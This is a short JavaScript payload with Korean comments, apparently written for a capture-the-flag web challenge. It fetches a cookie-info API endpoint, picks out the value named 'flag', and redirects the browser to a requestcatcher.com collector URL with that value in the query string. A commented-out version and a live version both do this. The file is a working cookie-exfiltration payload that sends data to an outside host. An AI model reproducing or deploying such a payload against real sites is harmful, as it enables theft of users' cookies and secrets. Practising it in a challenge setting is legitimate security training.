/*fetch('/api/v1/my_cookie_info')
  .then((response) => response.json())  // 응답을 JSON으로 파싱
  .then((data) => {
    // 쿠키 리스트 중에서 이름이 'flag'인 값을 찾음
    const flagCookie = data.cookies.find(cookie => 'flag' in cookie);
    
    // 'flag' 쿠키가 있으면 해당 값으로 리디렉션
    if (flagCookie) {
      const flagValue = flagCookie.flag;
      location.href = 'https://sflee.requestcatcher.com/test?flag=' + flagValue;
    } else {
      console.log('Flag 쿠키가 존재하지 않습니다.');
    }
  })
  .catch((error) => {
    console.error('Error:', error);
  });*/

fetch("http://sflee.kro.kr:5555/api/v1/my_cookie_info")
  .then((response) => response.json())
  .then((data) => {var cookie = data.cookies[0]; location.href = "https://sflee.requestcatcher.com/test?flag=" + cookie;});
